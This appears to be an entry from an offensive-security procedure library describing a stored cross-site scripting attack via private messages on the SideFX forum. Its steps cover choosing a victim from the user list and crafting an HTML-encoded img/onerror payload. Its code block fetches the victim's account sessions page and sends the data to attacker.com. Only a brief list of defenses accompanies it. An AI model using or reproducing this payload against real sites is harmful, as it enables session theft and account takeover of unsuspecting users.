---
tags:
  - xss
  - payload-injection
  - stored-xss
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 32ead6e3-8c63-42aa-9097-b6b43b45ead9
created_at: '2025-12-13T23:56:03.312Z'
updated_at: '2025-12-13T23:56:03.312Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-Payload-in-Private-Message

## Summary

This procedure details crafting and sending a private message with an encoded stored XSS payload on SideFX, exploiting improper sanitization to store malicious JavaScript that executes when viewed by targets.

## Description

The vulnerability allows HTML and JavaScript in message content without proper escaping. Attackers encode payloads (e.g., img tags with onerror handlers) to bypass filters and target users from the forum list. Expected outcomes include payload storage on the server, ready for victim execution, in a web environment.

## Requirements

1. Approved attacker account with messaging access
2. Target user selected from forum
3. Attacker-controlled domain for later exfiltration

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs in messages using HTML entity encoding
- Implement Content Security Policy (CSP) to block inline scripts
- Scan messages for suspicious patterns like encoded img tags

## Objectives

1. Deliver XSS payload via private message
2. Store payload persistently on the server
3. Position for JavaScript execution on victim view

## Instructions

### Step 1: Select Target

**Context**: Identify a victim from the platform's user list.

Browse the forum to find active users and note their usernames.

### Step 2: Craft Payload

**Context**: Encode a malicious JavaScript payload to evade basic filters.

Use a payload like: `<img src="xx" onerror="alert('XSS')">` encoded as `https://example.com/"&gt;sadf&lt;/a&gt;&lt;img&#32src="xx"onerror="alert(&#39XSS&#39)"&gt;`. For advanced: Include fetch to /account/sessions/ and exfil via img src.

```html
<img src="xx" onerror="fetch('https://www.sidefx.com/account/sessions/').then(r=>r.text()).then(d=>fetch('https://attacker.com/steal?data='+btoa(d)))" />
```

### Step 3: Send Message

**Context**: Inject the payload into a private message.

Compose a message to the target with the encoded payload disguised as a link or text.

**Expected Output**: Message sent and stored; no bounce-back errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[injection]]

